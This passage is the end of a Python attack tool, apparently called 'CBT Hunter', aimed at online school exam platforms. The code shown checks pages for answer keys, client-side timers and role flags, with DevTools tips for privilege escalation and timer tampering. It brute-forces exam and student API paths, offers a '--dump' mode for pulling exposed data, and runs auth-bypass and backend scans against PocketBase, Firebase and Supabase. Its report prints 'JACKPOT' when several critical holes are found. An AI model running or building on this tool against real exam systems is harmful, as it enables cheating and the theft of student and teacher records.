        r'isAdmin\s*[=:]\s*(true|false)',
        r'userRole\s*[=:]\s*["\'](\w+)',
    ]
    for pat in role_patterns:
        matches = re.findall(pat, html)
        if matches:
            add_finding("HIGH", "Client-Side Role Control",
                        f"Pattern: {pat.split('(')[0].strip()} — manipulate via DevTools for privilege escalation")

    timer_patterns = [
        r'(?:timer|countdown|time_left|durasi|waktu|remaining)\s*[=:]\s*\d+',
        r'setInterval\s*\([^)]*(?:timer|countdown|time)',
        r'setTimeout\s*\([^)]*(?:submit|finish|selesai)',
    ]
    for pat in timer_patterns:
        if re.search(pat, html, re.I):
            add_finding("MEDIUM", "Client-Side Timer Control",
                        "Exam timer runs client-side — can be paused/manipulated via DevTools")
            break

    if re.search(r'(?:correct|benar|kunci|answer_key|jawaban_benar)\s*[=:]', html, re.I):
        add_finding("CRITICAL", "Answer Key in Client-Side Code",
                    "Correct answers embedded in HTML/JS — students can see answers via view-source")

    headers_check = {
        "X-Frame-Options": ("MEDIUM", "Missing X-Frame-Options", "Clickjacking possible"),
        "Content-Security-Policy": ("MEDIUM", "Missing CSP", "No Content-Security-Policy — XSS risk higher"),
        "Strict-Transport-Security": ("MEDIUM", "Missing HSTS", "No HSTS — downgrade attacks possible"),
    }
    for header, (sev, title, detail) in headers_check.items():
        if header not in hdrs:
            add_finding(sev, title, detail)

    if vulns:
        info(f"Client-side storage usage ({len(vulns)} keys found):")
        for v in vulns[:10]:
            print(f"    {C}→{RST} {v}")

# ═══════════════════════════════════════════
#  MODULE 9: GENERIC CBT ENDPOINT SCAN
# ═══════════════════════════════════════════
CBT_API_WORDLIST = [
    "/api/ujian", "/api/soal", "/api/jawaban", "/api/siswa", "/api/guru",
    "/api/pengawas", "/api/kelas", "/api/sekolah", "/api/nilai", "/api/mapel",
    "/api/kunci", "/api/exam", "/api/exams", "/api/question", "/api/questions",
    "/api/answer", "/api/answers", "/api/student", "/api/students",
    "/api/teacher", "/api/teachers", "/api/proctor", "/api/proctors",
    "/api/class", "/api/classes", "/api/school", "/api/schools",
    "/api/score", "/api/scores", "/api/result", "/api/results",
    "/api/subject", "/api/subjects", "/api/grade", "/api/grades",
    "/api/report", "/api/reports", "/api/config", "/api/settings",
    "/api/v1/ujian", "/api/v1/soal", "/api/v1/siswa", "/api/v1/guru",
    "/api/v1/exams", "/api/v1/students", "/api/v1/questions",
    "/api/v1/answers", "/api/v1/scores", "/api/v1/results",
    "/api/data/ujian", "/api/data/soal", "/api/data/siswa",
    "/api/collections", "/api/records",
    "/rest/v1/ujian", "/rest/v1/soal", "/rest/v1/siswa",
    "/graphql", "/api/graphql",
]

def generic_cbt_scan(target_url):
    section("GENERIC CBT ENDPOINT SCAN")
    base = base_url(target_url)
    found = []

    def check_endpoint(path):
        c, h, b = fetch(f"{base}{path}", timeout=6)
        if c in (200, 201) and len(b) > 20:
            return (path, c, len(b), b[:300])
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_endpoint, p): p for p in CBT_API_WORDLIST}
        for f in as_completed(futures):
            result = f.result()
            if result:
                path, code, size, preview = result
                found.append(result)
                ok(f"{path} → {code} ({size} bytes)")
                try:
                    data = json.loads(preview)
                    if isinstance(data, (list, dict)):
                        has_data = bool(data)
                        if has_data:
                            add_finding("HIGH", f"CBT Endpoint Open: {path}",
                                        f"Returns data ({size} bytes) without auth")
                except:
                    pass

    if found:
        info(f"Found {len(found)} accessible CBT endpoints")
    else:
        info("No open CBT-specific endpoints found via brute force")

    return found

# ═══════════════════════════════════════════
#  REPORT GENERATOR
# ═══════════════════════════════════════════
def generate_report(target_url, platform):
    section("SCAN REPORT")
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "INFO": 3}
    sorted_findings = sorted(findings, key=lambda f: severity_order.get(f["severity"], 99))

    counts = defaultdict(int)
    for f in findings:
        counts[f["severity"]] += 1

    print(f"""
  {BOLD}Target:{RST}   {target_url}
  {BOLD}Platform:{RST} {platform}
  {BOLD}Findings:{RST} {len(findings)} total
    {R}CRITICAL:{RST} {counts.get('CRITICAL', 0)}
    {Y}HIGH:{RST}     {counts.get('HIGH', 0)}
    {M}MEDIUM:{RST}   {counts.get('MEDIUM', 0)}
    {C}INFO:{RST}     {counts.get('INFO', 0)}
""")

    if counts.get("CRITICAL", 0) >= 3:
        print(f"  {R}{BOLD}{'='*50}")
        print(f"  JACKPOT — MULTIPLE CRITICAL FINDINGS")
        print(f"  {'='*50}{RST}\n")

    for i, f in enumerate(sorted_findings, 1):
        sev_color = {"CRITICAL": R, "HIGH": Y, "MEDIUM": M, "INFO": C}.get(f["severity"], W)
        print(f"  {sev_color}{BOLD}[{f['severity']}]{RST} #{i}: {f['title']}")
        print(f"    {D}{f['detail']}{RST}")

    report_data = {
        "target": target_url,
        "platform": platform,
        "scan_time": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
        "summary": dict(counts),
        "total_findings": len(findings),
        "findings": sorted_findings,
    }

    return report_data

# ═══════════════════════════════════════════
#  MAIN ORCHESTRATOR
# ═══════════════════════════════════════════
def main():
    banner()

    if len(sys.argv) < 2:
        print(f"  {Y}Usage:{RST} python3 cbt_hunter.py <url> [options]")
        print(f"  {D}Options:{RST}")
        print(f"    --deep         Deep scan (more payloads, slower)")
        print(f"    --dump         Dump exposed data (pagination abuse)")
        print(f"    --platform X   Force platform (pocketbase|firebase|supabase|laravel|generic)")
        print(f"    --pb-url URL   PocketBase backend URL (if different from target)")
        print(f"    --fb-id ID     Firebase project ID")
        print(f"    --sb-key KEY   Supabase anon key")
        print(f"    --output FILE  Save report to JSON")
        sys.exit(1)

    target = sys.argv[1]
    if not target.startswith("http"):
        target = f"https://{target}"

    deep = "--deep" in sys.argv
    dump = "--dump" in sys.argv
    force_platform = None
    pb_url = None
    fb_id = None
    sb_key = None
    output_file = None

    for i, arg in enumerate(sys.argv):
        if arg == "--platform" and i + 1 < len(sys.argv):
            force_platform = sys.argv[i + 1]
        elif arg == "--pb-url" and i + 1 < len(sys.argv):
            pb_url = sys.argv[i + 1]
        elif arg == "--fb-id" and i + 1 < len(sys.argv):
            fb_id = sys.argv[i + 1]
        elif arg == "--sb-key" and i + 1 < len(sys.argv):
            sb_key = sys.argv[i + 1]
        elif arg == "--output" and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]

    info(f"Target: {target}")
    info(f"Mode: {'DEEP' if deep else 'STANDARD'} | Dump: {'ON' if dump else 'OFF'}")

    js_data = hunt_js_secrets(target)

    if force_platform:
        platform = force_platform
        info(f"Platform forced: {platform}")
    else:
        platform = detect_platform(target, js_data)

    if pb_url:
        platform = "pocketbase"
    elif js_data.get("secrets", {}).get("pocketbase_url") or js_data.get("secrets", {}).get("pocketbase_host"):
        pb_urls = list(js_data["secrets"].get("pocketbase_url", set())) + \
                  list(js_data["secrets"].get("pocketbase_host", set()))
        for u in pb_urls:
            clean = re.sub(r'["\']', '', u).rstrip("/")
            if clean.startswith("http") and "/api/" in clean:
                pb_url = clean.rsplit("/api/", 1)[0]
                break
            elif clean.startswith("http"):
                pb_url = clean
                break

    if platform == "pocketbase":
        scan_url = pb_url or base_url(target)
        scan_pocketbase(scan_url, deep=deep, dump=dump)
    elif platform == "firebase":
        firebase_id = fb_id
        firebase_db = None
        if not firebase_id and js_data.get("secrets", {}).get("firebase_db"):
            fb_urls = list(js_data["secrets"]["firebase_db"])
            if fb_urls:
                firebase_db = fb_urls[0]
                firebase_id = firebase_db.split("//")[1].split(".")[0]
        if firebase_id or firebase_db:
            scan_firebase(firebase_id, firebase_db)
        else:
            info("No Firebase project ID found — run with --fb-id <project_id>")
    elif platform == "supabase":
        sb_url = None
        if js_data.get("secrets", {}).get("supabase_url"):
            sb_url = list(js_data["secrets"]["supabase_url"])[0]
        if sb_url:
            scan_supabase(sb_url, sb_key)
        else:
            info("No Supabase URL found — run with target being supabase URL")
    elif platform == "laravel":
        scan_laravel(target)

    auth_bypass_battery(target)
    client_side_audit(target)
    generic_cbt_scan(target)

    report = generate_report(target, platform)

    if output_file:
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        ok(f"Report saved → {output_file}")

    print(f"\n  {M}{BOLD}{'═'*60}")
    print(f"  CBT Hunter scan complete — {len(findings)} findings")
    print(f"  {'═'*60}{RST}\n")


if __name__ == "__main__":
    main()
